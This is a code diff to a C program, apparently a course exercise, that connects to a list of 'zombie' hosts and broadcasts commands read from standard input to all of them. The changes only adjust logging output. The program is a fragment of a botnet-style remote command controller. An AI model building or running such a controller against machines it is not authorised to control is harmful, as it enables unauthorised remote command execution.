@@ -21,7 +21,6 @@ int main(int argc, char *argv[]) {
   char** hostnames = (char**) malloc((argc - 1) * sizeof(char*));
   for (int i = 1; i < argc; i++) {
     hostnames[i - 1] = argv[i];
-    printf("%s\n", hostnames[i - 1]);
   }
 
   struct IpPortFd *ipPortFd = (struct IpPortFd*) malloc(((argc - 1) * NUM_PORTS) * sizeof(struct IpPortFd));
@@ -43,8 +42,9 @@ int main(int argc, char *argv[]) {
     }
   }
 
+  printf("Running zombies:\n");
   for (int i = 0; i < nbConnections; i++) {
-    printf("%s, %d, %d\n", ipPortFd[i].ip, ipPortFd[i].port, ipPortFd[i].fd);
+    printf("%s:%d\n", ipPortFd[i].ip, ipPortFd[i].port);
   }
 
   if (nbConnections > 0) {
@@ -57,11 +57,7 @@ int main(int argc, char *argv[]) {
         int nbCharRd = sread(0, command, BUFFER_SZ);
 
         for (int i = 0; i < nbConnections; i++) {
-          char* ip = ipPortFd[i].ip;
-          int port = ipPortFd[i].port;
           int sockfd = ipPortFd[i].fd;
-
-          printf("\n%s:%d\n\n", ip, port);
 
           nwrite(sockfd, command, nbCharRd);
         }
